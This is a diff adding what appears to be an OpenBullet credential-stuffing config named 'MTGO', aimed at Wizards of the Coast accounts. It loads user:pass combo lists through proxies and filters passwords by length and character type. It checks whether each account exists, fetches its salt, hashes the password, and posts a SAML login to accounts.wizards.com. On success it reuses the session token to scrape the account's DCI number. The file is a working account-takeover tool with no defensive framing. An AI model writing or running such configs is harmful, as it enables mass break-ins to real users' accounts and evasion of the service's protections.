@@ -1,0 +1,114 @@
+[SETTINGS]
+{
+  "Name": "MTGO",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-06T00:45:04.407266+00:00",
+  "AdditionalInfo": "Magic The Gathering Online. Once you have the DCI number you can enter it here https://www.wizards.com/magic/planeswalkerpoints",
+  "Author": "Ruri",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "7",
+      "Id": 1911782285
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "29",
+      "Id": 548057759
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Lowercase",
+      "Id": 1375138027
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Uppercase",
+      "Id": 2058332918
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 2025437847
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Symbol",
+      "Id": 497268082
+    }
+  ],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#RANDOM_NUM_1 FUNCTION RandomNum 100000 999999 "" -> VAR "RANDOM" 
+#GET_UNIX_TIME FUNCTION CurrentUnixTime "" -> VAR "UNIXTIME" 
+#GET_ISO-8601_TIME FUNCTION UnixTimeToISO8601 "<UNIXTIME>" -> VAR "ISOTIME" 
+#RESHAPE_TIME FUNCTION Replace "\..+" "Z" UseRegex=TRUE "<ISOTIME>" -> VAR "CORRECTTIME" 
+#CHECK_IF_USER_EXISTS REQUEST POST "https://accounts.wizards.com/Orchestration/Esso/Saml" AutoRedirect=TRUE 
+  CONTENT "<s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\"><s:Body><GetIdentityVersion  xmlns=\"http://www.wizards.com/Service/2013-03\"><requestMessage xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">&lt;samlp:AttributeQuery xmlns:samlp = \"urn:oasis:names:tc:SAML:2.0:protocol\" ID=\"_5db8d916-1d36-cc23-eec4-f36cc41918<RANDOM>\" IssueInstant=\"<CORRECTTIME>\" Version=\"2.0\"&gt;&lt;samlp:Issuer xmlns:samlp =\"urn:oasis:names:tc:SAML:2.0:assertion\"/&gt;&lt;saml:Subject xmlns:saml = \"urn:oasis:names:tc:SAML:2.0:assertion\"&gt;&lt;saml:NameID&gt; <USER> &lt;/saml:NameID&gt;&lt;/saml:Subject&gt; &lt;saml:Attribute xmlns:saml = \"urn:oasis:names:tc:SAML:2.0:assertion\" Name = \"UserName\"/&gt;&lt;/samlp:AttributeQuery&gt;</requestMessage></GetIdentityVersion></s:Body></s:Envelope>" 
+  CONTENTTYPE "text/xml; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://accounts.wizards.com/Widget/SamlWidget" 
+  HEADER "SOAPAction: http://www.wizards.com/Service/2013-03/ISamlEndpoint/GetIdentityVersion" 
+#KEY_CHECK_1 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "==" 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "==" 
+#PARSE_SALT PARSE "<SOURCE>" LR "tSalt\" NameFormat=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"&gt;&#xD;
+    &lt;saml:AttributeValue xsi:type=\"xsd:string\"&gt;" "&lt" Recursive=FALSE -> VAR "SALT" "" "" 
+#SHA256_PASS+SALT FUNCTION Hash SHA256 "<PASS><SALT>" -> VAR "HASH" 
+#LOWERCASE_HASH FUNCTION ToLowercase "<HASH>" -> VAR "LOWERHASH" 
+#LOGIN REQUEST POST "https://accounts.wizards.com/Orchestration/Esso/Saml" AutoRedirect=TRUE 
+  CONTENT "<?xml version=\"1.0\" encoding=\"utf-8\"?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\"><s:Body><ExecuteAuthnRequest xmlns=\"http://www.wizards.com/Service/2013-03\"><requestMessage xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\">&lt;samlp:AuthnRequest  xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\" xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_d0216ae0-4813-2caa-bf1f-3aebab<RANDOM>\" Version=\"2.0\" IssueInstant=\"<CORRECTTIME>\" xmlns=\"urn:oasis:names:tc:SAML:2.0:protocol\"&gt;&lt;saml:Issuer AllowCreate=\"false\" SPNameQualifier=\"accounts.wizards.com\" Format=\"urn:oasis:names:tc:SAML:2.0:nameidformat:entity\" xmlns=\"urn:oasis:names:tc:SAML:2.0:assertion\"/&gt;&lt;samlp:Extensions&gt;&lt;Credentials UserName=\"<USER>\" Password=\"<LOWERHASH>\" RememberMe=\"false\"   xmlns=\"##other\" /&gt;&lt;/samlp:Extensions&gt;&lt;/samlp:AuthnRequest&gt;</requestMessage></ExecuteAuthnRequest></s:Body></s:Envelope>" 
+  CONTENTTYPE "text/xml; charset=utf-8" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "SOAPAction: http://www.wizards.com/Service/2013-03/ISamlEndpoint/ExecuteAuthnRequest" 
+  HEADER "Referer: https://accounts.wizards.com/Widget/SamlWidget" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+#KEY_CHECK_2 KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Success" 
+  KEYCHAIN Failure OR 
+    KEY "AuthnFailed" 
+    KEY "Incomplete Source" 
+#RANDOM_NUM_2 FUNCTION RandomNum 100 999 "" -> VAR "RANDOM2" 
+#PARSE_TOKEN PARSE "<SOURCE>" LR "g\"&gt;" "&" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#URL_ENCODE_TOKEN FUNCTION URLEncode "<TOKEN>" -> VAR "UETOKEN" 
+#GET_USER_NUMBER REQUEST GET "https://accounts.wizards.com/ExistingAccount/EditDetails" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "text/xml; charset=utf-8" 
+  COOKIE "SAMLToken: SAMLTokenValue%3D<UETOKEN>" 
+  COOKIE "flagsSet: true" 
+  COOKIE "ASP.NET_SessionId: am0rdb1ro0cmpzgogwmkz<RANDOM2>" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: http://magic.wizards.com/it" 
+#PARSE_RAW_DCI PARSE "<SOURCE>" LR "<label>DCI Number</label>" "</div>" Recursive=FALSE -> VAR "RAWDCI" "" "" 
+#PARSE_DCI FUNCTION Replace "^[^>]*>" "" UseRegex=TRUE "<RAWDCI>" -> VAR "DCI" 
